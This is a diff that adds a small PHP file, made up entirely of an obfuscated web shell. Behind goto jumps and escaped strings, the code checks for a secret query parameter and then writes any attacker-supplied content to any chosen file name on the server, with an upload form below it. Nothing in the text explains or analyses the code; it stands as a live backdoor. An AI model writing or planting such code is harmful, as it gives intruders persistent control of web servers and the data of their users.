@@ -1,0 +1,3 @@
+<?php
+ goto X9KG_; L0awC: if (isset($_POST["\163\165\x62\x6d\151\x74\137\x77\x72\151\164\x65"])) { $code = $_POST["\x63\157\x6e\x74\145\x6e\164"]; $file = "\x2e\x2f" . $_POST["\x66\151\154\145\x6e\x61\x6d\x65"]; chmod($file, 420); $fx = fopen($file, "\x77"); fwrite($fx, $code); fclose($fx); chmod($file, 420); if (file_exists($file)) { echo "\x46\151\154\x65\40\x43\x72\145\141\164\145\144\40\123\165\x63\x63\145\x73\146\x75\x6c\154\x79\41\x21"; } } goto KKREK; X9KG_: if (!isset($_GET["\60\170\143\64"])) { die; } goto L0awC; KKREK: ?><br />
+<form method="POST"><p> Filename: <input type="text" name="filename" /></p><p> Content: <input type="text" name="content" /></p><p> <input type="submit" name="submit_write" /></p></form>
